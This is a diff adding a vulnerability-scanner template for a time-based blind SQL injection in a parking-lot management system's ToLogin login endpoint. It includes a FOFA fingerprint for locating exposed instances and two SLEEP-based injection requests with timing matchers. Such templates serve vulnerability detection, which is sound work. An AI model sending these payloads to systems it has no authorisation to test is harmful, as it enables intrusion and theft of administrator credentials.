@@ -1,0 +1,41 @@
+id: tingchechang-ToLogin-sql
+
+info:
+  name: "停车场后台管理系统 ToLogin 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="938984120"
+      停车场后台管理系统 ToLogin 接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露，包括但不限于管理员凭证、用户隐私数据等。在特定权限条件下，该漏洞可能被利用来执行未经授权的服务器端代码写入操作，最终导致系统权限被完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486567&idx=1&sn=a25adfb68fac33e071b9640b2fb62c3b&chksm=c267b954f5103042f7025ba8c8ee4ce5d193e2eeba4fcae34e9f43f89c074f348f7b2b0ff030&token=1628549949&lang=zh_CN#rd
+  tags: 停车场后台管理系统
+
+
+http:
+- raw:
+  - |
+    POST /Login/ToLogin HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(4)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
+
+  - |
+    POST /Login/ToLogin HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(8)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
